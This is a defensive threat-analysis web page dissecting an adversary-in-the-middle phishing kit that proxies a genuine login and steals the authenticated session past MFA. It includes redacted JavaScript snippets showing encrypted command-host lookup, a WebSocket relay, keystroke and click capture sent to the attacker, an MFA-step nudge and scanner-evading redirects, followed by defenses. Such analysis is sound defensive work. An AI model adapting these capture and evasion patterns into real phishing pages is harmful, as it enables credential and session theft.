@@ -1,0 +1,431 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Adversary in the Middle — how relay phishing defeats your MFA</title>
+<meta name="description" content="A defensive teardown of an adversary-in-the-middle phishing kit that proxies the genuine login in real time and steals the authenticated session — and what actually stops it.">
+
+<!-- Open Graph / LinkedIn preview. Replace https://cydra-intel.github.io/research with the deployed URL, e.g. https://cydra.io/research/aitm -->
+<meta property="og:type" content="article">
+<meta property="og:title" content="The login page is real. The theft is live.">
+<meta property="og:description" content="How adversary-in-the-middle phishing proxies the genuine login and steals your session — even with MFA. A defensive teardown.">
+<meta property="og:url" content="https://cydra-intel.github.io/research/articles/adversary-in-the-middle.html">
+<meta property="og:image" content="https://cydra-intel.github.io/research/og-cover.png">
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="675">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="The login page is real. The theft is live.">
+<meta name="twitter:description" content="How adversary-in-the-middle phishing steals your session even with MFA — a defensive teardown.">
+<meta name="twitter:image" content="https://cydra-intel.github.io/research/og-cover.png">
+
+<meta name="theme-color" content="#f5f6f8" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#0d0f14" media="(prefers-color-scheme: dark)">
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600;700&family=IBM+Plex+Serif:ital,wght@0,400;0,500;1,400&family=IBM+Plex+Mono:wght@400;500;600&display=swap">
+<style>
+  /* Layout: single reading column, dark "code-editor" cards punctuating serif body.
+     One semantic accent (threat red); a separate teal only for the defense section. */
+  :root{
+    --bg:#f5f6f8; --surface:#ffffff; --fg:#15171d; --muted:#596070; --line:#e3e6ec;
+    --accent:#cf4133; --accent-soft:rgba(207,65,51,.10);
+    --defend:#0c8375; --defend-soft:rgba(12,131,117,.10);
+    --code-bg:#11141b; --code-fg:#e8ecf4; --code-muted:#8b96ab;
+    --code-com:#6f7b93; --code-str:#86d6b8; --code-red:#ff7a6b; --code-kw:#c3a0f0;
+    --maxw:44rem; color-scheme:light;
+  }
+  @media (prefers-color-scheme:dark){ :root:not([data-theme="light"]){
+    --bg:#0d0f14; --surface:#151921; --fg:#e8ebf1; --muted:#9aa3b2; --line:#252b35;
+    --accent:#ff6a5a; --accent-soft:rgba(255,106,90,.14);
+    --defend:#36b9a8; --defend-soft:rgba(54,185,168,.14);
+    color-scheme:dark;
+  }}
+  :root[data-theme="dark"]{
+    --bg:#0d0f14; --surface:#151921; --fg:#e8ebf1; --muted:#9aa3b2; --line:#252b35;
+    --accent:#ff6a5a; --accent-soft:rgba(255,106,90,.14);
+    --defend:#36b9a8; --defend-soft:rgba(54,185,168,.14);
+    color-scheme:dark;
+  }
+
+  *{box-sizing:border-box}
+  html{-webkit-text-size-adjust:100%}
+  body{
+    margin:0;
+    background:var(--bg); color:var(--fg);
+    font-family:"IBM Plex Serif",Georgia,"Times New Roman",serif;
+    line-height:1.7; font-size:1.0625rem;
+    padding-left:max(18px,env(safe-area-inset-left,0px));
+    padding-right:max(18px,env(safe-area-inset-right,0px));
+    padding-block:0;
+  }
+  img{max-width:100%}
+  .wrap{max-width:var(--maxw); margin:0 auto; padding-block:3.5rem 4.5rem}
+  .sans{font-family:"IBM Plex Sans",system-ui,sans-serif}
+
+  .theme-toggle{
+    position:fixed; top:14px; right:14px; z-index:50;
+    width:2.3rem; height:2.3rem; border-radius:50%;
+    border:1px solid var(--line); background:var(--surface); color:var(--fg);
+    font-size:1rem; cursor:pointer; line-height:1;
+    display:flex; align-items:center; justify-content:center;
+    box-shadow:0 2px 10px rgba(0,0,0,.10);
+  }
+  .theme-toggle:focus-visible{outline:2px solid var(--accent); outline-offset:2px}
+
+  .eyebrow{
+    font-family:"IBM Plex Sans",sans-serif; font-weight:600; font-size:.74rem;
+    letter-spacing:.14em; text-transform:uppercase; color:var(--accent);
+    display:flex; align-items:center; gap:.6rem; margin-bottom:1.1rem;
+  }
+  .eyebrow::before{content:""; width:1.6rem; height:2px; background:var(--accent); display:inline-block}
+
+  h1{
+    font-family:"IBM Plex Sans",sans-serif; font-weight:700;
+    font-size:clamp(2rem,6vw,3.1rem); line-height:1.08; letter-spacing:-.02em;
+    text-wrap:balance; margin:0 0 1rem;
+  }
+  .dek{font-size:clamp(1.1rem,2.6vw,1.3rem); color:var(--muted); font-style:italic; margin:0 0 1.8rem; text-wrap:balance}
+  .meta{
+    font-family:"IBM Plex Sans",sans-serif; font-size:.82rem; color:var(--muted);
+    display:flex; flex-wrap:wrap; gap:.5rem 1rem; align-items:center;
+    padding-bottom:1.6rem; border-bottom:1px solid var(--line); margin-bottom:2.4rem;
+  }
+  .meta b{color:var(--fg); font-weight:600}
+
+  h2{
+    font-family:"IBM Plex Sans",sans-serif; font-weight:600;
+    font-size:clamp(1.4rem,3.4vw,1.75rem); line-height:1.2; letter-spacing:-.01em;
+    text-wrap:balance; margin:3rem 0 .9rem;
+  }
+  h2 .num{color:var(--accent); font-variant-numeric:tabular-nums; margin-right:.5rem}
+  p{margin:0 0 1.15rem}
+  .wrap > p, .wrap > h2, .wrap > .lead{max-width:38rem}
+  .lead{font-size:1.18rem}
+  strong{font-weight:600}
+  em{font-style:italic}
+  a{color:var(--accent); text-underline-offset:3px}
+
+  .pull{
+    font-family:"IBM Plex Sans",sans-serif; font-weight:600;
+    font-size:clamp(1.25rem,3.2vw,1.6rem); line-height:1.3; letter-spacing:-.01em;
+    color:var(--fg); border-left:3px solid var(--accent);
+    padding:.2rem 0 .2rem 1.25rem; margin:2rem 0; text-wrap:balance;
+  }
+
+  /* code cards */
+  figure{margin:2rem 0; max-width:100%}
+  .card{
+    background:var(--code-bg); border:1px solid #20262f; border-radius:12px;
+    overflow:hidden; box-shadow:0 10px 30px -18px rgba(0,0,0,.6);
+  }
+  .card-bar{
+    display:flex; align-items:center; gap:.6rem;
+    padding:.6rem .95rem; border-bottom:1px solid #20262f; background:#0c0f15;
+  }
+  .dot{width:.62rem; height:.62rem; border-radius:50%; background:#2c333f}
+  .card-name{
+    font-family:"IBM Plex Mono",monospace; font-size:.76rem; color:var(--code-muted);
+    margin-left:.3rem;
+  }
+  .pill{
+    margin-left:auto; font-family:"IBM Plex Sans",sans-serif; font-weight:600;
+    font-size:.64rem; letter-spacing:.08em; text-transform:uppercase;
+    color:var(--code-red); background:rgba(255,122,107,.12);
+    border:1px solid rgba(255,122,107,.3); border-radius:999px; padding:.18rem .5rem;
+  }
+  pre{margin:0; overflow-x:auto}
+  code{font-family:"IBM Plex Mono",monospace; font-size:.82rem; line-height:1.75}
+  pre code{display:block; padding:1.05rem 1.15rem; color:var(--code-fg); min-width:0}
+  figcaption{
+    font-family:"IBM Plex Sans",sans-serif; font-size:.85rem; color:var(--muted);
+    margin-top:.7rem; padding-left:.1rem;
+  }
+  .c{color:var(--code-com); font-style:italic}
+  .s{color:var(--code-str)}
+  .r{color:var(--code-red); font-weight:600}
+  .k{color:var(--code-kw)}
+  .m{color:var(--code-muted)}
+
+  ul.clean{list-style:none; padding:0; margin:0 0 1.3rem; max-width:38rem}
+  ul.clean li{position:relative; padding-left:1.5rem; margin-bottom:.75rem}
+  ul.clean li::before{
+    content:""; position:absolute; left:0; top:.62em; width:.5rem; height:.5rem;
+    border:2px solid var(--accent); border-radius:50%;
+  }
+
+  .defense{
+    background:var(--defend-soft); border:1px solid color-mix(in srgb,var(--defend) 32%,transparent);
+    border-radius:14px; padding:1.6rem 1.7rem; margin:2.2rem 0;
+  }
+  .defense h2{margin-top:0; color:var(--defend)}
+  .defense ul.clean li::before{border-color:var(--defend)}
+  .defense .pull{border-left-color:var(--defend); color:var(--fg)}
+
+  .note{
+    font-family:"IBM Plex Sans",sans-serif; font-size:.86rem; line-height:1.6;
+    color:var(--muted); background:var(--surface); border:1px solid var(--line);
+    border-radius:12px; padding:1.1rem 1.3rem; margin-top:3rem;
+  }
+  .note b{color:var(--fg)}
+  hr{border:none; border-top:1px solid var(--line); margin:3rem 0}
+  .tag{color:var(--accent); font-weight:600}
+
+  .site-footer{
+    max-width:var(--maxw); margin:0 auto; padding:2.5rem 0 3.5rem;
+    border-top:1px solid var(--line);
+    font-family:"IBM Plex Sans",sans-serif; font-size:.82rem; color:var(--muted);
+    display:flex; flex-wrap:wrap; gap:.4rem .9rem; align-items:center;
+  }
+  .site-footer b{color:var(--fg); font-weight:600; letter-spacing:.02em}
+</style>
+</head>
+<body>
+<header style="max-width:44rem;margin:0 auto;padding:1.15rem 0 0;display:flex;align-items:center;gap:.55rem;font-family:'IBM Plex Sans',system-ui,sans-serif">
+  <a href="../index.html" style="display:flex;align-items:center;gap:.5rem;text-decoration:none;color:var(--fg);font-weight:700;letter-spacing:.09em;font-size:.95rem">
+    <span style="color:var(--accent);font-size:.8rem">◆</span> CYDRA
+  </a>
+  <span style="color:var(--muted);font-size:.8rem">· Research</span>
+</header>
+
+<button class="theme-toggle" id="themeToggle" type="button" aria-label="Toggle light or dark theme" title="Toggle theme">◐</button>
+
+<div style="max-width:70rem;margin:1.5rem auto 0;padding-left:max(18px,env(safe-area-inset-left,0px));padding-right:max(18px,env(safe-area-inset-right,0px))">
+  <figure style="margin:0">
+    <svg role="img" aria-label="Cover: 'The login page is real. The theft is live.' An adversary-in-the-middle relay sits between you and the real service, passing the genuine login through while siphoning off your logged-in session." viewBox="0 0 1200 675" style="width:100%;height:auto;display:block;border-radius:16px;font-family:'IBM Plex Sans',system-ui,sans-serif">
+      <defs>
+        <linearGradient id="heroBg" x1="0" y1="0" x2="1" y2="1"><stop offset="0" stop-color="#0a0d13"/><stop offset="1" stop-color="#111826"/></linearGradient>
+        <radialGradient id="gctr" cx="0.5" cy="0.5" r="0.5"><stop offset="0" stop-color="#ff5a47" stop-opacity="0.30"/><stop offset="1" stop-color="#ff5a47" stop-opacity="0"/></radialGradient>
+        <linearGradient id="dg" x1="0" y1="0" x2="0" y2="1"><stop offset="0" stop-color="#ff7a63"/><stop offset="1" stop-color="#e23d2b"/></linearGradient>
+        <marker id="exarrow" markerWidth="10" markerHeight="10" refX="7.5" refY="3" orient="auto"><path d="M0,0 L8,3 L0,6 Z" fill="#ff5a47"/></marker>
+      </defs>
+      <rect x="0" y="0" width="1200" height="675" fill="url(#heroBg)"/>
+      <rect x="3" y="3" width="1194" height="669" rx="15" fill="none" stroke="#ffffff" stroke-opacity="0.06"/>
+      <circle cx="600" cy="474" r="190" fill="url(#gctr)"/>
+      <text x="80" y="150" fill="#ff7059" font-size="18" font-weight="600" letter-spacing="4">DEFENSIVE THREAT ANALYSIS</text>
+      <text x="80" y="236" fill="#f4f6fb" font-size="64" font-weight="700">The login page is real.</text>
+      <text x="80" y="312" font-size="64" font-weight="700"><tspan fill="#f4f6fb">The theft is </tspan><tspan fill="#ff5a47">live.</tspan></text>
+      <text x="80" y="360" fill="#93a0b8" font-size="23">Adversary-in-the-middle phishing — and why your MFA doesn’t stop it.</text>
+      <line x1="214" y1="474" x2="556" y2="474" stroke="#46506a" stroke-width="3"/>
+      <line x1="644" y1="474" x2="986" y2="474" stroke="#46506a" stroke-width="3"/>
+      <circle cx="180" cy="474" r="36" fill="#141b27" stroke="#39445a" stroke-width="2"/>
+      <circle cx="180" cy="466" r="9" fill="#93a0b8"/>
+      <path d="M164,490 a16,16 0 0,1 32,0" fill="#93a0b8"/>
+      <circle cx="1020" cy="474" r="36" fill="#141b27" stroke="#39445a" stroke-width="2"/>
+      <circle cx="1020" cy="474" r="13" fill="none" stroke="#93a0b8" stroke-width="2"/>
+      <line x1="1007" y1="474" x2="1033" y2="474" stroke="#93a0b8" stroke-width="2"/>
+      <ellipse cx="1020" cy="474" rx="6.5" ry="13" fill="none" stroke="#93a0b8" stroke-width="2"/>
+      <rect x="562" y="436" width="76" height="76" rx="12" transform="rotate(45 600 474)" fill="url(#dg)"/>
+      <circle cx="600" cy="462" r="11" fill="#ffffff"/>
+      <path d="M582,496 a18,18 0 0,1 36,0 z" fill="#ffffff"/>
+      <text x="600" y="405" text-anchor="middle" fill="#ff7059" font-size="19" font-weight="600">Attacker relay</text>
+      <text x="180" y="530" text-anchor="middle" fill="#93a0b8" font-size="18" font-weight="500">You</text>
+      <text x="1020" y="530" text-anchor="middle" fill="#93a0b8" font-size="18" font-weight="500">Real service</text>
+      <line x1="600" y1="514" x2="600" y2="598" stroke="#ff5a47" stroke-width="3" stroke-dasharray="7 7" marker-end="url(#exarrow)"/>
+      <text x="600" y="630" text-anchor="middle" fill="#ff7059" font-size="18" font-weight="500">your logged-in session, stolen live</text>
+    </svg>
+  </figure>
+</div>
+
+<div class="wrap">
+
+  <div class="eyebrow">Defensive threat analysis</div>
+  <h1>The phishing page that loads the <em>real</em> login</h1>
+  <p class="dek">A look at an adversary-in-the-middle kit that doesn't fake your sign-in screen — it proxies the genuine one, live, and walks off with the session your password and MFA just created.</p>
+  <div class="meta">
+    <span><b>Phishing kit teardown</b></span>
+    <span>·</span>
+    <span>Indicators, brands, infrastructure &amp; keys withheld</span>
+    <span>·</span>
+    <span>November 2026</span>
+  </div>
+
+  <p class="lead">For years the advice has been the same: before you type your password, look at the page. Check the URL for typos. Watch for the slightly-wrong logo, the clumsy layout, the off-brand font. Spot the fake.</p>
+
+  <p>That advice is quietly going obsolete. I recently pulled apart a phishing kit that never builds a fake login page at all. It serves an almost-empty shell, opens a tunnel back to the attacker, and streams you the <em>authentic</em> sign-in page — the real HTML, the real logo, the real everything — because it is literally relaying the target's own website to you in real time. There is nothing visually wrong to spot, because nothing about what you see is fake. Only the wire underneath it is.</p>
+
+  <p>This is <strong>adversary-in-the-middle</strong> (AitM) phishing, and it's worth understanding in plain terms, because it changes what "be careful" has to mean. What follows is a sanitized walkthrough — brand names, domains, indicators and the kit's encryption key are deliberately left out.</p>
+
+  <h2><span class="num">01</span>What it actually is</h2>
+  <p>Classic phishing is a <em>copy</em>: the attacker rebuilds a login page, hosts it, and collects whatever you type. It's static, and it's catchable — the copy is never perfect, and your password alone is often useless once multi-factor authentication (MFA) kicks in.</p>
+  <p>This kit is a <em>proxy</em>, not a copy. Think of it as a hostile middleman sitting on the phone line between you and the real service. When you load the link, the kit connects to the attacker's server; that server opens the real login on your behalf and pipes it to your screen. You type; your keystrokes are relayed to the real site. The real site replies; that reply is relayed back to you. To you it's a flawless login. To the attacker it's a live feed of everything — including the one thing that actually matters.</p>
+
+  <p class="pull">It isn't trying to steal your password. It's trying to steal the <em>session</em> your password unlocks.</p>
+
+  <h2><span class="num">02</span>The attack, end to end</h2>
+  <p>Here's the whole sequence in one picture. Every message between you and the real service passes through the attacker's relay in the middle — and the thing they walk away with is never something you typed.</p>
+
+  <figure style="background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:1.3rem 1.05rem;max-width:100%">
+    <svg role="img" aria-label="An adversary-in-the-middle relay attack in three lanes — victim, attacker relay, real service. The victim opens an encrypted tunnel to the relay; the relay opens the genuine login; the real login is streamed back to the victim; the victim's password and approved MFA are relayed through to the real service; the real service issues a session token that the attacker captures in the middle." viewBox="0 0 860 532" style="width:100%;height:auto;color:var(--fg);font-family:'IBM Plex Sans',system-ui,sans-serif">
+      <defs>
+        <marker id="ah" markerWidth="10" markerHeight="10" refX="7.5" refY="3" orient="auto"><path d="M0,0 L8,3 L0,6 Z" fill="currentColor"/></marker>
+        <marker id="aha" markerWidth="10" markerHeight="10" refX="7.5" refY="3" orient="auto"><path d="M0,0 L8,3 L0,6 Z" style="fill:var(--accent)"/></marker>
+      </defs>
+      <line x1="140" y1="56" x2="140" y2="432" stroke="currentColor" stroke-opacity="0.2" stroke-dasharray="3 5"/>
+      <line x1="430" y1="56" x2="430" y2="432" stroke="currentColor" stroke-opacity="0.2" stroke-dasharray="3 5"/>
+      <line x1="720" y1="56" x2="720" y2="432" stroke="currentColor" stroke-opacity="0.2" stroke-dasharray="3 5"/>
+      <rect x="52" y="14" width="176" height="40" rx="9" fill="var(--surface)" stroke="currentColor" stroke-opacity="0.35"/>
+      <text x="140" y="39" text-anchor="middle" font-size="14" font-weight="600" fill="currentColor">Victim</text>
+      <rect x="342" y="14" width="176" height="40" rx="9" style="fill:var(--accent-soft);stroke:var(--accent)"/>
+      <text x="430" y="39" text-anchor="middle" font-size="14" font-weight="700" style="fill:var(--accent)">Attacker relay</text>
+      <rect x="632" y="14" width="176" height="40" rx="9" fill="var(--surface)" stroke="currentColor" stroke-opacity="0.35"/>
+      <text x="720" y="39" text-anchor="middle" font-size="14" font-weight="600" fill="currentColor">Real service</text>
+      <text x="285" y="86" text-anchor="middle" font-size="12.5" fill="currentColor">1 · clicks lure, opens an encrypted tunnel</text>
+      <line x1="150" y1="99" x2="408" y2="99" stroke="currentColor" stroke-width="2" marker-end="url(#ah)"/>
+      <text x="575" y="134" text-anchor="middle" font-size="12.5" fill="currentColor">2 · relay opens the genuine login</text>
+      <line x1="452" y1="147" x2="688" y2="147" stroke="currentColor" stroke-width="2" marker-end="url(#ah)"/>
+      <rect x="280" y="183" width="300" height="16" fill="var(--surface)"/>
+      <text x="430" y="195" text-anchor="middle" font-size="12.5" fill="currentColor">3 · real login page streamed back — looks authentic</text>
+      <line x1="690" y1="209" x2="152" y2="209" stroke="currentColor" stroke-width="2" marker-end="url(#ah)"/>
+      <circle cx="430" cy="209" r="4.5" style="fill:var(--accent)"/>
+      <rect x="280" y="239" width="300" height="16" fill="var(--surface)"/>
+      <text x="430" y="251" text-anchor="middle" font-size="12.5" fill="currentColor">4 · password typed — captured and relayed live</text>
+      <line x1="150" y1="265" x2="688" y2="265" stroke="currentColor" stroke-width="2" marker-end="url(#ah)"/>
+      <circle cx="430" cy="265" r="4.5" style="fill:var(--accent)"/>
+      <rect x="285" y="295" width="290" height="16" fill="var(--surface)"/>
+      <text x="430" y="307" text-anchor="middle" font-size="12.5" fill="currentColor">5 · MFA prompt relayed down; victim approves it</text>
+      <line x1="690" y1="321" x2="152" y2="321" stroke="currentColor" stroke-width="2" marker-end="url(#ah)"/>
+      <circle cx="430" cy="321" r="4.5" style="fill:var(--accent)"/>
+      <text x="575" y="363" text-anchor="middle" font-size="12.5" font-weight="600" style="fill:var(--accent)">6 · session token issued → attacker captures it</text>
+      <line x1="690" y1="377" x2="438" y2="377" stroke-width="2" style="stroke:var(--accent)" marker-end="url(#aha)"/>
+      <circle cx="430" cy="377" r="6" fill="none" style="stroke:var(--accent)" stroke-width="2"/>
+      <rect x="52" y="452" width="756" height="66" rx="11" style="fill:var(--accent-soft);stroke:var(--accent)"/>
+      <text x="430" y="480" text-anchor="middle" font-size="13" font-weight="600" fill="currentColor">The attacker walks away with a live, logged-in session —</text>
+      <text x="430" y="501" text-anchor="middle" font-size="13" fill="currentColor">the victim entered the right password and approved MFA, and it still wasn't enough.</text>
+    </svg>
+    <figcaption>Every exchange between the victim and the genuine service is relayed through the attacker in the middle. Because the attacker is in the loop in real time, a one-time MFA code is still live when it arrives — and the authenticated session it unlocks is the real prize.</figcaption>
+  </figure>
+
+  <h2><span class="num">03</span>An empty page that knows where to call home</h2>
+  <p>The page that lands in your browser is nearly blank. Its first act is to decrypt its own command server out of the link you clicked — the destination is never written in plain text anywhere on the page, so there's no address to notice or block.</p>
+
+  <figure>
+    <div class="card">
+      <div class="card-bar"><span class="dot"></span><span class="card-name">shell.js — simplified &amp; redacted</span><span class="pill">Key redacted</span></div>
+<pre><code><span class="c">// The page arrives almost empty. Its first job is to</span>
+<span class="c">// decrypt its own command host out of a URL parameter.</span>
+<span class="k">const</span> host = <span class="k">await</span> decrypt(
+  params.get(<span class="s">"enc"</span>),          <span class="c">// ciphertext, carried in the link</span>
+  <span class="r">"[ REDACTED — hard-coded AES key ]"</span>
+);
+<span class="c">// No destination is ever written in plain text.</span>
+<span class="k">const</span> tunnel = <span class="k">new</span> WebSocket(<span class="s">`wss://${host}/…`</span>);</code></pre>
+    </div>
+    <figcaption>The real command host is hidden inside an encrypted link parameter. Pull the page apart and you still don't see where it phones home — until you decrypt it.</figcaption>
+  </figure>
+
+  <h2><span class="num">04</span>It opens a tunnel, not a form</h2>
+  <p>Instead of a form that submits somewhere, the page holds open a two-way connection. The attacker's server pushes down the <em>live</em> target login — genuine brand HTML — and the shell paints it straight onto the screen. This is why "look for the fake" fails: what you're looking at isn't a forgery, it's the real page on a hijacked wire.</p>
+
+  <figure>
+    <div class="card">
+      <div class="card-bar"><span class="dot"></span><span class="card-name">relay.js — simplified &amp; redacted</span><span class="pill">Behavior shown</span></div>
+<pre><code>tunnel.onmessage = (event) => {
+  <span class="k">const</span> msg = JSON.parse(event.data);
+  <span class="k">if</span> (msg.type === <span class="s">"content"</span>) {
+    <span class="c">// The server streams the REAL login page, live.</span>
+    <span class="c">// The victim sees genuine, pixel-perfect brand HTML.</span>
+    document.documentElement.innerHTML = msg.content;
+    rebindHandlers();
+  }
+};</code></pre>
+    </div>
+    <figcaption>Every screen you see — email prompt, password prompt, MFA challenge — is proxied from the real service the instant before you see it.</figcaption>
+  </figure>
+
+  <h2><span class="num">05</span>Every keystroke goes to the attacker</h2>
+  <p>As you interact, the shell quietly records each field you fill and each button you press, and streams them back up the tunnel. The attacker isn't reading a dump of stolen passwords after the fact — they're watching you sign in, live, with enough detail to replay it against the real site in the same moment.</p>
+
+  <figure>
+    <div class="card">
+      <div class="card-bar"><span class="dot"></span><span class="card-name">capture.js — simplified &amp; redacted</span><span class="pill">Behavior shown</span></div>
+<pre><code><span class="k">function</span> captureInput(selector, value) {
+  <span class="c">// Every field the victim types into is logged…</span>
+  log.push({ selector, text: value });
+}
+<span class="k">function</span> captureClick(selector) {
+  <span class="c">// …and every click is streamed back up the tunnel.</span>
+  log.push({ selector, text: <span class="s">"click"</span> });
+  tunnel.send(JSON.stringify(log));
+}</code></pre>
+    </div>
+    <figcaption>Keystrokes and clicks, relayed in real time. Because the attacker is in the loop as it happens, an MFA code isn't a dead one-time value to them — it's live.</figcaption>
+  </figure>
+
+  <h2><span class="num">06</span>Why your MFA won't save you here</h2>
+  <p>This is the part that surprises people. Traditional MFA — a six-digit code from an app or a text message — assumes the attacker is working <em>after</em> you. They steal a password today, try to use it later, and the code they don't have stops them. But a relay attacker is working <em>during</em> you. When the real service asks for your code, that prompt is relayed to you; you enter it; it's relayed straight back and used instantly. The kit even nudges you through it — injecting a reassuring line at exactly the right step so you don't hesitate at the MFA screen:</p>
+
+  <figure>
+    <div class="card">
+      <div class="card-bar"><span class="dot"></span><span class="card-name">nudge.js — simplified &amp; redacted</span><span class="pill">Behavior shown</span></div>
+<pre><code><span class="c">// Injected right before the MFA step: a calm, on-brand</span>
+<span class="c">// line engineered to make the victim comply, not pause.</span>
+inject(<span class="s">"&lt;div&gt;To continue, first verify it’s you&lt;/div&gt;"</span>);</code></pre>
+    </div>
+    <figcaption>Once you approve that prompt, the attacker holds a fully authenticated session — the same thing you'd hold after a legitimate login. The password was never the prize.</figcaption>
+  </figure>
+
+  <h2><span class="num">07</span>Built to be invisible to scanners</h2>
+  <p>The kit is also designed to slip past the automated tooling that hunts phishing all day. Open the link without the exact parameters an intended victim would have, and it simply forwards you to a well-known, trusted website — so a crawler sees a redirect to a legitimate brand and moves on. The malicious behavior only wakes up for the right visitor.</p>
+
+  <figure>
+    <div class="card">
+      <div class="card-bar"><span class="dot"></span><span class="card-name">gate.js — simplified &amp; redacted</span><span class="pill">Behavior shown</span></div>
+<pre><code><span class="k">const</span> id  = params.get(<span class="s">"id"</span>);
+<span class="k">const</span> enc = params.get(<span class="s">"enc"</span>);
+<span class="c">// No valid link parameters? Bounce to a well-known,</span>
+<span class="c">// trusted site, so a passing scanner sees nothing wrong.</span>
+<span class="k">if</span> (!id || !enc) {
+  window.location.href = <span class="s">"https://[ trusted-brand ].com"</span>;
+}</code></pre>
+    </div>
+    <figcaption>To an automated scanner with no link parameters, the page looks like a harmless redirect. The teardown only works because the behavior is in the code, not the appearance.</figcaption>
+  </figure>
+
+  <p>A few more craftsmanship details stood out: the interface is localized into several languages, it keeps the tunnel alive with periodic heartbeats, and it handles the full flow — email, password, MFA, "try another way" — not just a single credential grab. This isn't a weekend script. It's a product.</p>
+
+  <hr>
+
+  <div class="defense">
+    <h2>What actually stops it</h2>
+    <p>The uncomfortable takeaway: you cannot reliably beat this by looking harder at the page, because the page is real. The defenses that work move the trust away from human judgment and onto cryptography and context.</p>
+    <ul class="clean">
+      <li><strong>Phishing-resistant MFA is the real fix.</strong> Passkeys and FIDO2 hardware security keys bind the login to the <em>true</em> website's origin. A relayed sign-in is happening on the attacker's domain, so the key refuses to sign — the one factor the middleman can't relay. If you do one thing, make it this.</li>
+      <li><strong>Trust the address bar, not the pixels.</strong> When the page itself is genuine, the domain in the URL is the last thing that's still honest. Bookmark your important logins and reach them directly instead of through links in mail or messages.</li>
+      <li><strong>For defenders: hunt behavior, not brands.</strong> There's no fake logo to match on. The fingerprint is structural — a near-empty page that opens a socket and streams in a login — and it survives every change of lure and brand.</li>
+      <li><strong>For organizations:</strong> shorten session lifetimes, require re-authentication for sensitive actions, and tie sessions to managed, known devices so a stolen session token is worth far less on its own.</li>
+    </ul>
+    <p class="pull">The question stopped being "does this page look real?" It does. The question is "can my second factor be relayed?" — and for most people, today, the honest answer is yes.</p>
+  </div>
+
+  <div class="note">
+    <b>Responsible disclosure.</b> This is a defensive explainer, not a build guide. The code shown is simplified and redacted; brand names, domains, indicators of compromise, infrastructure and the kit's encryption key have been withheld and shared through the appropriate detection and platform channels. Nothing here can be reassembled into a working kit or used to reach live infrastructure.
+  </div>
+
+</div>
+
+<footer class="site-footer">
+  <span><a href="../index.html" style="color:inherit;text-decoration:none"><b>Cydra</b></a> · Threat Research</span>
+  <span>·</span>
+  <span>November 2026</span>
+</footer>
+
+<script>
+  (function () {
+    var root = document.documentElement, KEY = "cydra-theme";
+    try { var saved = localStorage.getItem(KEY); if (saved === "dark" || saved === "light") root.setAttribute("data-theme", saved); } catch (e) {}
+    var btn = document.getElementById("themeToggle");
+    if (btn) btn.addEventListener("click", function () {
+      var cur = root.getAttribute("data-theme");
+      var prefersDark = window.matchMedia && window.matchMedia("(prefers-color-scheme: dark)").matches;
+      var isDark = cur ? cur === "dark" : prefersDark;
+      var next = isDark ? "light" : "dark";
+      root.setAttribute("data-theme", next);
+      try { localStorage.setItem(KEY, next); } catch (e) {}
+    });
+  })();
+</script>
+
+</body>
+</html>
